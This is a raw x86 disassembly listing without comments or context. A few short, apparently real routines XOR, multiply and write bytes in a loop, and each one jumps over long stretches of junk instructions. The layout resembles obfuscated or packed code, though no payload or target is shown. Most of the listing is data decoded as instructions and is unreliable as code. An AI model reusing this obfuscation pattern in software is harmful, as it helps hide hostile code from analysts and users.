  406ad0:	mov    esi,esp
  406ad2:	loopne 0x406a96
  406ad4:	mov    esp,0x90e69948
  406ad9:	mov    edi,0x6ef203e1
  406ade:	jl     0x406b31
  406ae0:	dec    ecx
  406ae1:	push   esi
  406ae2:	dec    edx
  406ae3:	jge    0x406a66
  406ae5:	sbb    edi,ecx
  406ae7:	mov    esp,0x45ee907a
  406aec:	test   eax,0x48e98e3e
  406af1:	mov    al,dh
  406af3:	add    BYTE PTR [edx+ebx*1-0x6f],0xb4
  406af8:	cmp    al,al
  406afa:	pop    ss
  406afb:	xor    al,BYTE PTR [ebx-0x6130d6c8]
  406b01:	aad    0xf7
  406b03:	push   edx
  406b04:	jecxz  0x406b3c
  406b06:	push   es
  406b07:	(bad)  
  406b08:	sti    
  406b09:	xor    BYTE PTR [edi],ch
  406b0b:	inc    ecx
  406b0c:	and    DWORD PTR [eax+edi*1-0x3826e02a],0xd5e829d2
  406b17:	fisubr WORD PTR [edx]
  406b19:	jns    0x406b6b
  406b1b:	and    al,0x9d
  406b1d:	aaa    
  406b1e:	inc    esi
  406b1f:	mov    bh,0xe0
  406b21:	daa    
  406b22:	shr    dl,0xc2
  406b25:	sub    eax,DWORD PTR [ecx]
  406b27:	or     esp,DWORD PTR [ebx+0x42]
  406b2a:	out    dx,al
  406b2b:	and    eax,0x745f7291
  406b30:	rcr    DWORD PTR ss:[ecx-0x37456134],1
  406b37:	xor    BYTE PTR [esi],0xb1
  406b3a:	dec    esi
  406b3b:	inc    ebx
  406b3c:	mov    ?,WORD PTR [ebx+ebp*8-0x19d1d25e]
  406b43:	sub    ebp,DWORD PTR ds:0x3badacc2
  406b49:	ja     0x406ad5
  406b4b:	add    eax,0xe9d103f7
  406b50:	pop    esi
  406b51:	add    al,0x0
  406b53:	add    BYTE PTR [ebx-0x2fcc17ab],cl
  406b59:	add    edx,DWORD PTR [ebp-0x14]
  406b5c:	mov    edi,DWORD PTR [ebp-0x1c]
  406b5f:	mov    dl,BYTE PTR [edx+edi*1+0x32729f]
  406b66:	mov    BYTE PTR [ebp+0xf],dl
  406b69:	mov    edx,DWORD PTR [ebp-0xc]
  406b6c:	xor    edx,eax
  406b6e:	add    edx,DWORD PTR [ebp-0x14]
  406b71:	jmp    0x406cc3
  406b76:	mov    ah,0x9b
  406b78:	scas   al,BYTE PTR es:[edi]
  406b79:	pop    es
  406b7a:	popa   
  406b7b:	cmp    edx,DWORD PTR [ebp+0x59]
  406b7e:	(bad)  
  406b80:	xor    DWORD PTR [eax+0x135d7dc6],ecx
  406b86:	jecxz  0x406b8e
  406b88:	jle    0x406c08
  406b8a:	and    edi,DWORD PTR [edi+0x7e]
  406b8d:	jle    0x406b84
  406b8f:	xor    eax,0x87bba637
  406b94:	cmp    eax,0xdb397214
  406b99:	retf   
  406b9a:	inc    eax
  406b9b:	mov    al,0x58
  406b9d:	dec    edi
  406b9e:	ins    BYTE PTR es:[edi],dx
  406b9f:	jmp    0x30e9:0x52abd897
  406ba6:	ret    
  406ba7:	lock mov cl,0x56
  406baa:	jb     0x406b7d
  406bac:	and    BYTE PTR [ebx+0x921fa45],ah
  406bb2:	push   ecx
  406bb3:	pop    edx
  406bb4:	cmp    DWORD PTR [esp+ecx*2+0x5f3d5962],edx
  406bbb:	xor    eax,DWORD PTR [ecx+esi*2+0x70cb4b3d]
  406bc2:	fldl2t 
  406bc4:	xchg   esi,eax
  406bc5:	out    0x2e,eax
  406bc7:	fidivr WORD PTR [esi+0x6f]
  406bca:	mov    dl,0xab
  406bcc:	outs   dx,DWORD PTR ds:[esi]
  406bcd:	sbb    al,0xe2
  406bcf:	dec    ecx
  406bd0:	stos   BYTE PTR es:[edi],al
  406bd1:	leave  
  406bd2:	outs   dx,BYTE PTR ds:[esi]
  406bd3:	mov    edi,0xb65ca09d
  406bd8:	imul   esi,edi,0x45c80a5b
  406bde:	mov    al,ds:0xbb7cad8f
  406be3:	push   eax
  406be4:	push   eax
  406be5:	xor    bh,bl
  406be7:	repnz dec ebp
  406be9:	sar    dl,cl
  406beb:	test   ebx,edi
  406bed:	mov    ebx,0xcefb4ff4
  406bf2:	imul   eax,DWORD PTR [eax+0x6],0xd96b27b6
  406bf9:	scas   eax,DWORD PTR es:[edi]
  406bfa:	lahf   
  406bfb:	lock ret 
  406bfd:	mov    cl,0xf7
  406bff:	sub    DWORD PTR [esi+ebp*2-0x54812a9c],ebx
  406c06:	or     BYTE PTR [edx-0x4e70d285],ah
  406c0c:	xor    WORD PTR [edi+0x1f],cx
  406c10:	sbb    DWORD PTR [ebx-0x55],esi
  406c13:	stos   BYTE PTR es:[edi],al
  406c14:	cmc    
  406c15:	push   esi
  406c16:	cmp    al,0xd4
  406c18:	nop    esp
  406c1b:	mov    eax,ds:0x488090e2
  406c20:	jne    0x406bae
  406c22:	mov    edx,DWORD PTR [eax]
  406c24:	cmp    al,0xa1
  406c26:	inc    esp
  406c27:	ja     0x406c62
  406c29:	in     eax,dx
  406c2a:	cmc    
  406c2b:	push   esp
  406c2c:	ss fwait
  406c2e:	test   DWORD PTR [edi],eax
  406c30:	call   DWORD PTR [ecx]
  406c32:	sub    al,0x54
  406c34:	cs dec ebx
  406c36:	push   ss
  406c37:	std    
  406c38:	or     al,0x7c
  406c3a:	dec    esp
  406c3b:	div    DWORD PTR [edi+ebx*2-0x72f1a009]
  406c42:	rcr    BYTE PTR [bp+di],cl
  406c45:	adc    al,0x4b
  406c47:	adc    eax,DWORD PTR [eax+edi*2]
  406c4a:	jg     0x406c1f
  406c4c:	aas    
  406c4d:	mov    ds:0x382cc93f,al
  406c52:	jecxz  0x406bfd
  406c54:	out    0x82,eax
  406c56:	cs push ebx
  406c58:	xchg   BYTE PTR [esi+0x3a0a3551],dh
  406c5e:	stos   BYTE PTR es:[edi],al
  406c5f:	cwde   
  406c60:	sub    DWORD PTR [edi-0x20],edi
  406c63:	jecxz  0x406c22
  406c65:	cmp    DWORD PTR [ecx+0x5ade04c9],0xffffffe7
  406c6c:	pop    eax
  406c6d:	iret   
  406c6e:	js     0x406cc2
  406c70:	pop    edx
  406c71:	lea    ecx,[edi]
  406c73:	xchg   DWORD PTR [edx],ebx
  406c75:	cmp    al,0x76
  406c77:	(bad)  
  406c78:	in     al,0x9
  406c7a:	and    al,0xfb
  406c7c:	icebp  
  406c7d:	(bad)  
  406c7e:	fadd   DWORD PTR [esi]
  406c80:	fs jp  0x406c0d
  406c83:	xchg   esp,eax
  406c84:	int    0x51
  406c86:	(bad)  
  406c87:	push   ebx
  406c88:	mov    ebx,0x8a83fc92
  406c8d:	mov    ds:0x7e8bea0a,al
  406c92:	pop    edi
  406c93:	lahf   
  406c94:	adc    ebx,edi
  406c96:	outs   dx,BYTE PTR ds:[esi]
  406c97:	mov    eax,ds:0xde3ee036
  406c9c:	or     eax,0x8d038d89
  406ca1:	hlt    
  406ca2:	(bad)  
  406ca3:	cmp    eax,0x8286ae4
  406ca8:	scas   eax,DWORD PTR es:[edi]
  406ca9:	aas    
  406caa:	pop    edi
  406cab:	xchg   edi,eax
  406cac:	and    DWORD PTR [ebx-0x78],ebx
  406caf:	inc    ebx
  406cb0:	xor    BYTE PTR [ebp+0x2e6e24d8],ch
  406cb6:	in     eax,0x6e
  406cb8:	jmp    0x8e6c:0x2d1c96c8
  406cbf:	mov    ds:0x8b81a169,eax
  406cc4:	jge    0x406caa
  406cc6:	mov    dl,BYTE PTR [edx+edi*1+0x32729f]
  406ccd:	mov    BYTE PTR [ebp+0xb],dl
  406cd0:	mov    dl,BYTE PTR [ebp+0xf]
  406cd3:	mov    edi,DWORD PTR [ebp-0xc]
  406cd6:	xor    edi,eax
  406cd8:	add    edi,DWORD PTR [ebp-0x14]
  406cdb:	mov    ebx,DWORD PTR [ebp-0x1c]
  406cde:	jmp    0x406e30
  406ce3:	stos   DWORD PTR es:[edi],eax
  406ce4:	out    dx,eax
  406ce5:	pop    edx
  406ce6:	sbb    al,0x5a
  406ce8:	test   eax,0x2e197979
  406ced:	leave  
  406cee:	ss leave 
  406cf0:	sbb    eax,0x794a2a5
  406cf5:	jle    0x406d75
  406cf7:	and    edi,DWORD PTR [edi+0x7e]
  406cfa:	jle    0x406cb4
  406cfc:	push   edi
  406cfd:	inc    ebp
  406cfe:	xor    al,0x4a
  406d00:	adc    al,0x6b
  406d02:	les    esp,FWORD PTR [esp+edi*4]
  406d05:	cli    
  406d06:	pop    ecx
  406d07:	in     al,0x50
  406d09:	sbb    DWORD PTR [ecx-0x4f],esi
  406d0c:	sub    ebp,DWORD PTR [ebp+0x20]
  406d0f:	push   es
  406d10:	push   0x21
  406d12:	std    
  406d13:	js     0x406d30
  406d15:	add    al,0x90
  406d17:	mov    ecx,0xcdce3c13
  406d1c:	imul   edi,DWORD PTR [ebx],0x5c274f2f
  406d22:	jnp    0x406d05
  406d24:	loop   0x406cab
  406d26:	inc    esp
  406d27:	pop    edi
  406d28:	push   ebx
  406d29:	shl    ch,1
  406d2b:	pop    eax
  406d2c:	xchg   esp,eax
  406d2d:	or     al,0x74
  406d2f:	or     BYTE PTR [edx+0x6905a2da],dh
  406d35:	adc    BYTE PTR [ebx-0x72e93855],0xf1
  406d3c:	mov    al,0x49
  406d3e:	cmp    DWORD PTR [ecx+eiz*2-0x42],eax
  406d42:	xchg   esi,eax
  406d43:	push   0xffffff8a
  406d45:	xchg   edi,eax
  406d46:	mov    ch,0xbd
  406d48:	mov    dl,0xe4
  406d4a:	lods   eax,DWORD PTR ds:[esi]
  406d4b:	sbb    BYTE PTR [edx-0x2224296d],ch
  406d51:	mov    DWORD PTR [ecx+0x76],ebp
  406d54:	fistp  QWORD PTR [ebx+edi*4-0x75f5d62e]
  406d5b:	and    eax,0xc1707afd
  406d60:	fbld   TBYTE PTR [esi]
  406d62:	jae    0x406da6
  406d64:	imul   esp,edi,0xdadc1c4
  406d6a:	sbb    BYTE PTR ds:0x382dbab,0x59
  406d71:	repz loope 0x406db4
  406d74:	inc    ebx
  406d75:	aad    0x64
  406d77:	in     eax,0x8e
  406d79:	add    esp,DWORD PTR ds:0x19db4528
  406d7f:	pop    ebx
  406d80:	sub    eax,0xf719b62d
  406d85:	xchg   BYTE PTR [eax-0x720df4f0],cl
  406d8b:	out    dx,al
  406d8c:	hlt    
  406d8d:	mov    eax,ds:0x83589027
  406d92:	retf   0x5fb6
  406d95:	sti    
  406d96:	jns    0x406dd0
  406d98:	pop    ebp
  406d99:	into   
  406d9a:	out    dx,eax
  406d9b:	jb     0x406d36
  406d9d:	adc    ebp,0x7f
  406da0:	push   0x2ec6ec14
  406da5:	adc    al,0xc8
  406da7:	out    dx,eax
  406da8:	fsub   DWORD PTR ds:0xc8114e86
  406dae:	push   cs
  406daf:	call   0x3187d815
  406db4:	(bad)  
  406db5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406db7:	sub    DWORD PTR [eax+0x1a],eax
  406dba:	and    eax,0x99558326
  406dbf:	in     eax,0x3e
  406dc1:	and    DWORD PTR [ebp+0x1fa34139],eax
  406dc7:	cmp    DWORD PTR [ebx-0x7e],esp
  406dca:	push   esp
  406dcb:	es push esp
  406dcd:	fsubr  QWORD PTR [eax+eiz*1-0x38]
  406dd1:	dec    ecx
  406dd2:	(bad)  
  406dd3:	hlt    
  406dd4:	push   0x276d954d
  406dd9:	bound  eax,QWORD PTR [ebp+0x71f41d9a]
  406ddf:	adc    dl,dh
  406de1:	mov    ds:0x883b0821,al
  406de6:	and    BYTE PTR [ecx+0x3623aed9],dh
  406dec:	xlat   BYTE PTR ds:[ebx]
  406ded:	push   ss
  406dee:	mov    dh,0xba
  406df0:	push   edx
  406df1:	jl     0x406e15
  406df3:	iret   
  406df4:	pop    edx
  406df5:	dec    ebx
  406df6:	inc    edi
  406df7:	sbb    DWORD PTR [esi+0x2d],0x7c2e26de
  406dfe:	mov    esi,DWORD PTR [eax]
  406e00:	push   ebp
  406e01:	pop    eax
  406e02:	xor    eax,0xe116ad51
  406e07:	mov    dl,bh
  406e09:	mov    bh,0x4a
  406e0b:	dec    eax
  406e0c:	sbb    al,0xb3
  406e0e:	xchg   BYTE PTR [ecx],dh
  406e10:	mov    esp,0x7211765b
  406e15:	(bad)  
  406e17:	mov    dh,BYTE PTR [eax+0x794469d6]
  406e1d:	mov    BYTE PTR [ebx],dl
  406e1f:	or     BYTE PTR [edx],al
  406e21:	cdq    
  406e22:	dec    esp
  406e23:	jmp    0x13fc:0xfcea4135
  406e2a:	call   0xcd4b422e
  406e2f:	ror    BYTE PTR [eax+0x729f1f94],1
  406e35:	xor    al,BYTE PTR [eax]
  406e37:	jmp    0x406f89
  406e3c:	jns    0x406e62
  406e3e:	mov    dh,0xd8
  406e40:	dec    ebx
  406e41:	js     0x406ebc
  406e43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e44:	mov    BYTE PTR [esi-0x4],bl
  406e47:	lods   al,BYTE PTR ds:[esi]
  406e48:	adc    al,0x86
  406e4a:	pushf  
  406e4b:	mov    esp,0x7e7e0459
  406e50:	and    edi,DWORD PTR [edi+0x7e]
  406e53:	jle    0x406e7c
  406e55:	in     al,dx
  406e56:	cmc    
  406e57:	xlat   BYTE PTR ds:[ebx]
  406e58:	add    al,0xb6
  406e5a:	dec    esp
  406e5b:	adc    al,0x1
  406e5d:	stc    
  406e5e:	and    al,0xef
  406e60:	cmp    edx,DWORD PTR [edx+esi*8]
  406e63:	inc    BYTE PTR [ecx+0x2f96f599]
  406e69:	imul   ebp,DWORD PTR [ebx+0x12b63d13],0xffffffde
  406e70:	rol    BYTE PTR [esi+0x64f4226],1
  406e76:	xchg   esp,eax
  406e77:	mov    ebx,0xebc5cc0d
  406e7c:	push   ecx
  406e7d:	scas   al,BYTE PTR es:[edi]
  406e7e:	and    dl,ch
  406e80:	clc    
  406e81:	add    eax,0xc757178d
  406e86:	rol    BYTE PTR [edi],1
  406e88:	xor    ch,BYTE PTR [edi]
  406e8a:	stos   BYTE PTR es:[edi],al
  406e8b:	or     eax,0xc5d0a7f
  406e90:	mov    WORD PTR [edx],ds
  406e92:	scas   eax,DWORD PTR es:[edi]
  406e93:	cmp    DWORD PTR [ebx+0x4],esp
  406e96:	sub    esp,ebp
  406e98:	int    0xed
  406e9a:	mov    dl,0xb5
  406e9c:	sti    
  406e9d:	push   ecx
  406e9e:	repnz dec edi
  406ea0:	jmp    0x76a2:0x1bf614ec
  406ea7:	add    al,0xe9
  406ea9:	push   ecx
  406eaa:	pop    eax
  406eab:	(bad)  
  406eac:	shl    BYTE PTR [ecx-0x245f6d87],cl
  406eb2:	outs   dx,BYTE PTR ds:[esi]
  406eb3:	fldenv [ecx]
  406eb5:	mov    cl,0x45
  406eb7:	cmp    al,0x34
  406eb9:	pop    ebp
  406eba:	push   es
  406ebb:	xchg   edx,eax
  406ebc:	push   ss
  406ebd:	jecxz  0x406f05
  406ebf:	xchg   ebx,eax
  406ec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ec1:	scas   eax,DWORD PTR es:[edi]
  406ec2:	out    0xb9,eax
  406ec4:	enter  0xf25e,0x60
  406ec8:	aaa    
  406ec9:	mov    ah,0xee
  406ecb:	push   ds
  406ecc:	das    
  406ecd:	cdq    
  406ece:	jnp    0x406e97
  406ed0:	into   
  406ed1:	rol    bl,1
  406ed3:	inc    ebx
  406ed4:	call   0xb1e9:0xd001fd4d
  406edb:	or     eax,0xd908fc0a
  406ee0:	stc    
  406ee1:	popf   
  406ee2:	sbb    BYTE PTR [edi+0x4a],al
  406ee5:	adc    edx,DWORD PTR [eax+0x5dc68b47]
  406eeb:	clc    
  406eec:	fimul  DWORD PTR [edx-0x2c]
  406eef:	inc    edx
  406ef0:	outs   dx,BYTE PTR ds:[esi]
  406ef1:	stc    
  406ef2:	enter  0xb339,0xe1
  406ef6:	icebp  
  406ef7:	jae    0x406f28
  406ef9:	and    DWORD PTR [eax+edx*8],esi
  406efc:	lock inc ebx
  406efe:	mov    eax,0x43c5c15e
  406f03:	cmp    al,BYTE PTR [eax]
  406f05:	or     eax,0x57243b10
  406f0a:	clc    
  406f0b:	inc    esp
  406f0c:	add    BYTE PTR [ecx],al
  406f0e:	fs retf 0x7355
  406f12:	xchg   ebp,eax
  406f13:	inc    edx
  406f14:	and    bh,BYTE PTR [ebx+0x353e5fff]
  406f1a:	lock dec esi
  406f1c:	ret    
  406f1d:	xor    edx,DWORD PTR [edx-0x2c]
  406f20:	mov    al,0x2a
  406f22:	and    DWORD PTR [esi+0x6edd3387],ebx
  406f28:	jmp    0x168e:0x5283390b
  406f2f:	jmp    0x406f05
  406f31:	or     al,0x54
  406f33:	ror    BYTE PTR [ebx],cl
  406f35:	test   DWORD PTR ds:0xb41ca11e,ebp
  406f3b:	lds    edx,FWORD PTR [edi+edi*8-0x336f7f94]
  406f42:	mov    ah,BYTE PTR [esi+0x698d0d9d]
  406f48:	xor    ecx,DWORD PTR [eax-0x262bd414]
  406f4e:	dec    ebx
  406f4f:	fldpi  
  406f51:	xor    ebx,DWORD PTR [edx-0x9]
  406f54:	cmovbe esp,DWORD PTR [eax-0x4d]
  406f58:	cld    
  406f59:	dec    esp
  406f5a:	xor    esi,DWORD PTR [edi+0x31b4a1f2]
  406f60:	push   ds
  406f61:	out    dx,al
  406f62:	test   eax,0x80649a57
  406f67:	adc    al,0x32
  406f69:	or     BYTE PTR [ebx+0x6a859cb2],cl
  406f6f:	or     eax,0x78401d09
  406f74:	nop
  406f75:	fxch   st(1)
  406f77:	popfw  
  406f79:	shr    DWORD PTR [edx-0x34],0x10
  406f7d:	mov    eax,0x8b6c2c3d
  406f82:	add    eax,edx
  406f84:	inc    ebp
  406f85:	mov    dh,0xb5
  406f87:	push   es
  406f88:	mov    dl,BYTE PTR es:[ebp+0xb]
  406f8c:	mov    edi,DWORD PTR [ebp-0x18]
  406f8f:	xor    edi,eax
  406f91:	add    edi,DWORD PTR [ebp-0x14]
  406f94:	mov    ebx,DWORD PTR [ebp-0x1c]
  406f97:	mov    BYTE PTR [edi+ebx*1+0x32729f],dl
  406f9e:	mov    edx,DWORD PTR [ebp-0x44]
  406fa1:	mov    edi,DWORD PTR [ebp-0xc]
  406fa4:	xor    edx,eax
  406fa6:	xor    edi,eax
  406fa8:	add    edx,ecx
  406faa:	add    edi,ecx
  406fac:	imul   edx,edi
  406faf:	add    edx,DWORD PTR [ebp-0x14]
  406fb2:	mov    DWORD PTR [ebp-0x14],edx
  406fb5:	mov    edx,DWORD PTR [ebp-0xc]
  406fb8:	mov    edi,DWORD PTR [ebp-0x24]
  406fbb:	xor    edx,eax
  406fbd:	add    edx,ecx
  406fbf:	imul   edx,edi
  406fc2:	mov    edi,DWORD PTR [ebp-0xc]
  406fc5:	xor    edi,eax
  406fc7:	sub    edx,edi
  406fc9:	mov    edi,DWORD PTR [ebp-0xc]
  406fcc:	mov    ebx,DWORD PTR [ebp-0x14]
  406fcf:	xor    edi,eax
  406fd1:	add    edi,ecx
  406fd3:	imul   edi,ebx
  406fd6:	mov    ebx,DWORD PTR [ebp-0x18]
  406fd9:	xor    ebx,eax
  406fdb:	sub    edx,ecx
  406fdd:	lea    edi,[edi+ebx*1+0x32729f]
  406fe4:	cmp    edi,edx
  406fe6:	jbe    0x406b54
  406fec:	mov    edx,DWORD PTR [ebp-0xc]
  406fef:	mov    edi,DWORD PTR [ebp-0x24]
  406ff2:	xor    edx,eax
  406ff4:	add    edx,ecx
  406ff6:	imul   edx,edi
  406ff9:	mov    edi,DWORD PTR [ebp-0x18]
  406ffc:	xor    edi,eax
  406ffe:	jmp    0x407150
  407003:	hlt    
  407004:	jae    0x40702b
  407006:	pop    ds
  407007:	mov    ecx,0xa4a98439
  40700c:	pushf  
  40700d:	sbb    al,0x11
  40700f:	inc    eax
  407010:	outs   dx,BYTE PTR ds:[esi]
  407011:	pusha  
  407012:	leave  
  407013:	add    bl,BYTE PTR [edx]
  407015:	jle    0x407095
  407017:	and    edi,DWORD PTR [edi+0x7e]
  40701a:	jle    0x406fcb
  40701c:	aad    0x25
  40701e:	lock ror DWORD PTR [edi+0x66],1
  407022:	out    dx,eax
  407023:	mov    al,ds:0xd22d7fc0
  407028:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407029:	outs   dx,BYTE PTR ds:[esi]
  40702a:	aas    
  40702b:	or     DWORD PTR [ebx+0x22bed348],esi
  407031:	cmp    bl,cl
  407033:	mov    cl,0xaa
  407035:	xchg   ebp,eax
  407036:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  407038:	out    dx,eax
  407039:	pop    edi
  40703a:	outs   dx,BYTE PTR ds:[esi]
  40703b:	jae    0x4070b8
  40703d:	jle    0x407050
  40703f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407040:	xchg   edx,eax
  407041:	sar    BYTE PTR [edi-0x46],1
  407044:	outs   dx,BYTE PTR ds:[esi]
  407045:	cwde   
  407046:	adc    eax,0x7ef7c6b2
  40704b:	(bad)  
  40704c:	pop    ecx
  40704d:	jae    0x407048
  40704f:	mov    edi,0xdb3bfdd4
  407054:	retf   
  407055:	or     edi,DWORD PTR [ecx]
  407057:	sbb    esp,edi
  407059:	or     dh,ah
  40705b:	cmp    DWORD PTR [ebx],edi
  40705d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40705e:	call   FWORD PTR [ebx+0x3601ca3b]
  407064:	push   edx
  407065:	cmp    DWORD PTR [edx+ebp*2],edi
  407068:	imul   ebx,DWORD PTR [edi-0x19],0x510b515b
  40706f:	aas    
  407070:	xor    DWORD PTR [edi],esp
  407072:	mov    al,0xe6
  407074:	push   es
  407075:	sbb    DWORD PTR [bx],esi
  407078:	mov    ebp,0x302b57b9
  40707d:	xchg   ebp,eax
  40707e:	mov    al,ds:0xd26f1d07
  407083:	sbb    ah,0x58
  407086:	xor    al,0x8b
  407088:	(bad)  
  407089:	popf   
  40708a:	ins    BYTE PTR es:[edi],dx
  40708b:	dec    si
  40708d:	nop
  40708e:	dec    eax
  40708f:	addr16 in al,0x7a
  407092:	xchg   esi,eax
  407093:	jbe    0x407104
  407095:	jp     0x4070c8
  407097:	sbb    dh,BYTE PTR [eiz*4-0x17f78c90]
  40709e:	or     eax,DWORD PTR [ebx-0x3f16f097]
  4070a4:	or     eax,esi
  4070a6:	xchg   edx,eax
  4070a7:	xor    esp,edx
  4070a9:	into   
  4070aa:	shr    BYTE PTR [edi+0x71],cl
  4070ad:	mov    ebx,0x4c872234
  4070b2:	cmp    BYTE PTR [edx-0x5813a748],0x1
  4070b9:	sbb    DWORD PTR gs:[edx+0x1c],0xfffffff7
  4070be:	dec    esp
  4070bf:	fcomp  QWORD PTR [ebx]
  4070c1:	lea    ecx,[edi+0x1fae2eba]
  4070c7:	push   edx
  4070c8:	and    eax,0xd6d5143
  4070cd:	pop    ebp
  4070ce:	add    eax,0x59f19e74
  4070d3:	es jecxz 0x407102
  4070d6:	lock cmp DWORD PTR [ecx-0x2a],0x28ebff6e
  4070de:	sbb    ch,BYTE PTR [ecx+eax*4+0x6d590a31]
  4070e5:	jge    0x40715e
  4070e7:	fisub  WORD PTR [ebx]
  4070e9:	pop    eax
  4070ea:	sbb    DWORD PTR [ebx+0x7f6293f],0xb9781878
  4070f4:	inc    eax
  4070f5:	into   
  4070f6:	sbb    BYTE PTR [edi+0x7b1d4b56],dh
  4070fc:	leave  
  4070fd:	pop    ds
  4070fe:	pop    es
  4070ff:	push   0x5c
  407101:	or     cl,dh
  407103:	mov    dh,0xb9
  407105:	or     dl,dl
  407107:	inc    edx
  407108:	mul    BYTE PTR [esp+eax*1-0x411af0d]
  40710f:	xchg   BYTE PTR [ebp-0x7d3f4ab1],bl
  407115:	jns    0x4070b9
  407117:	scas   al,BYTE PTR es:[edi]
  407118:	xchg   edi,eax
  407119:	(bad)  
  40711a:	cli    
  40711b:	leave  
  40711c:	and    al,0xb6
  40711e:	cmp    BYTE PTR fs:[edx+0x5f],0x72
  407123:	sahf   
  407124:	add    cl,BYTE PTR [esi+ecx*2+0x393ef05b]
  40712b:	call   0xa2a0b680
  407130:	jnp    0x407157
  407132:	lods   eax,DWORD PTR ds:[esi]
  407133:	les    esp,FWORD PTR gs:[esi-0x16]
  407137:	inc    esi
  407138:	pushf  
  407139:	ret    0xb75a
  40713c:	mov    eax,ds:0x9615c212
  407141:	arpl   WORD PTR [edx],di
  407143:	mov    ch,0xb2
  407145:	stc    
  407146:	jo     0x407142
  407148:	xchg   edi,eax
  407149:	dec    esp
  40714a:	mov    BYTE PTR [esp+esi*1],bh
  40714d:	cmp    bl,bh
  40714f:	pop    edi
  407150:	add    edx,edi
  407152:	mov    edi,DWORD PTR [ebp-0x8]
  407155:	lea    edx,[edx+edi*1+0x32729f]
  40715c:	mov    DWORD PTR [ebp-0x8],edx
  40715f:	mov    edx,DWORD PTR [ebp-0x20]
  407162:	xor    edx,eax
  407164:	mov    edi,0xffcd8d61
  407169:	sub    edi,edx
  40716b:	add    edi,DWORD PTR [ebp-0x10]
  40716e:	jmp    0x4072c0
  407173:	sub    ebp,DWORD PTR [edi+0x59798f79]
  407179:	jmp    0x9398b939
  40717e:	sub    al,0x75
  407180:	fwait
  407181:	ins    BYTE PTR es:[edi],dx
  407182:	hlt    
  407183:	aaa    
  407184:	sbb    edi,DWORD PTR [esi+0x7e]
  407187:	and    edi,DWORD PTR [edi+0x7e]
  40718a:	jle    0x4071b0
  40718c:	mov    edx,0x872d979
  407191:	mov    BYTE PTR [ecx+edx*1],al
  407194:	retf   0x6db8
  407197:	rcl    BYTE PTR [eax+0x13c1dc7f],0x5d
  40719e:	repz mov ebp,0xa0f61007
  4071a4:	mov    DWORD PTR [ebx+0x30],0x7db23a25
  4071ab:	xchg   eax,ecx
  4071ad:	imul   ebp,DWORD PTR [ecx-0x3d29e4eb],0xffffffe4
  4071b4:	or     bl,dl
  4071b6:	mov    dl,0xb8
  4071b8:	fisttp DWORD PTR [esi]
  4071ba:	jae    0x407239
  4071bc:	ins    BYTE PTR es:[edi],dx
  4071bd:	dec    eax
  4071be:	pop    eax
  4071bf:	pop    ss
  4071c0:	xchg   DWORD PTR [ecx+0x7750846a],ebx
  4071c6:	sub    ecx,esp
  4071c8:	lea    ebp,[ebp+ebp*8-0x1b72ec3a]
  4071cf:	fcomp  QWORD PTR [edi-0x46]
  4071d2:	jle    0x40716b
  4071d4:	retf   
  4071d5:	sbb    BYTE PTR [ecx],ah
  4071d7:	in     eax,0x31
  4071d9:	dec    edx
  4071da:	fmul   QWORD PTR [esp+ebx*1+0x79]
  4071de:	ins    BYTE PTR es:[edi],dx
  4071df:	ds dec edi
  4071e1:	pop    ecx
  4071e2:	sar    BYTE PTR [edi+eiz*2-0x7b607180],0xd3
  4071ea:	dec    eax
  4071eb:	call   0xb76a:0xe2ec452f
  4071f2:	pop    esp
  4071f3:	pushf  
  4071f4:	dec    edi
  4071f5:	retf   0xa374
  4071f8:	cmp    BYTE PTR [ecx],ah
  4071fa:	sbb    eax,0xc7e9dc8d
  4071ff:	sub    bl,BYTE PTR [ecx*2+0x454a4d9d]
  407206:	aaa    
  407207:	repz inc esi
  407209:	xor    al,0x17
  40720b:	cs jb  0x407197
  40720e:	in     eax,0xea
  407210:	test   BYTE PTR [edi+0x31],0x99
  407214:	das    
  407215:	inc    edx
  407216:	xchg   ebp,eax
  407217:	sbb    al,0x91
  407219:	ror    DWORD PTR [ebp-0x64183622],1
  40721f:	inc    esi
  407220:	mov    edi,0x4b0d55fa
  407225:	(bad)  
  407226:	sub    edx,DWORD PTR [esi+0x40]
  407229:	push   edi
  40722a:	rcr    BYTE PTR [ebp+0x74],cl
  40722d:	mov    fs:0xea32f687,al
  407233:	mov    eax,0xe67460e4
  407238:	(bad)  
  407239:	sbb    dl,BYTE PTR [esi-0x5aac8e0d]
  40723f:	pop    ebp
  407240:	in     eax,dx
  407241:	and    BYTE PTR [ebp+0x64],ah
  407244:	mov    bl,0x5f
  407246:	rol    BYTE PTR [ecx-0x66c06c1e],0x99
  40724d:	jl     0x407224
  40724f:	push   esi
  407250:	std    
  407251:	push   ds
  407252:	ret    
  407253:	mov    ax,0x5b50
  407257:	adc    al,0xd
  407259:	ins    BYTE PTR es:[edi],dx
  40725a:	inc    esp
  40725b:	cmp    al,0x64
  40725d:	xchg   ecx,eax
  40725e:	jge    0x407241
  407260:	aas    
  407261:	out    dx,al
  407262:	sub    edi,DWORD PTR [ebp-0x77249c9d]
  407268:	inc    esp
  407269:	push   es
  40726a:	jmp    0x4072e5
  40726c:	int    0x95
  40726e:	cli    
  40726f:	jb     0x4072d7
  407271:	adc    eax,0xccdd1915
  407276:	pop    ecx
  407277:	aaa    
  407278:	stc    
  407279:	ja     0x407293
  40727b:	in     al,0x6c
  40727d:	aas    
  40727e:	mov    edx,0x789e9444
  407283:	jnp    0x407279
  407285:	jnp    0x407304
  407287:	xchg   edx,eax
  407288:	pop    es
  407289:	(bad)  
  40728a:	sub    eax,0x95831118
  40728f:	outs   dx,BYTE PTR ds:[esi]
  407290:	xor    DWORD PTR [edx+ebx*4+0x7e8ca687],eax
  407297:	sbb    DWORD PTR [ecx],eax
  407299:	sub    BYTE PTR [ebp-0x1317a89b],ch
  40729f:	sub    BYTE PTR ss:[edx],0xea
  4072a3:	out    dx,eax
  4072a4:	inc    esp
  4072a5:	lock (bad) 
  4072a7:	pop    ds
  4072a8:	push   ds
  4072a9:	sub    edx,DWORD PTR [ecx]
  4072ab:	daa    
  4072ac:	nop
  4072ad:	inc    ebx
  4072ae:	mov    esi,0x25e8ccbf
  4072b3:	push   edi
  4072b4:	das    
  4072b5:	add    al,0x6e
  4072b7:	mov    dh,0xa9
  4072b9:	dec    esi
